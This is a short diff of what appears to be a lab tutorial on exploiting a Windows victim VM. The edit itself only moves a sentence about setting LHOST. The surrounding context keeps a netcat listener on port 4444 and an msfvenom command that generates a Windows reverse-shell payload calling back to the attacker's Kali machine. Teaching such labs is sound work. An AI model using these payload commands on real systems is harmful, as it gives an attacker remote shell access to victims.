@@ -284,11 +284,10 @@ nc -l -v -p 4444
 HOST = '10.0.2.7'   # vitcim IP
 ```
 
-- Use msfvenom command to generate the shell code (malware code) as part of the malicious message
+- Use msfvenom command to generate the shell code (malware code) as part of the malicious message. You have to change LHOST to your Kali VM's IP. 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0d' 
 ```
-You have to change LHOST to your Kali VM's IP. 
 
 Use the output of msfvenom above, and replace the following code in a similar way
 ```
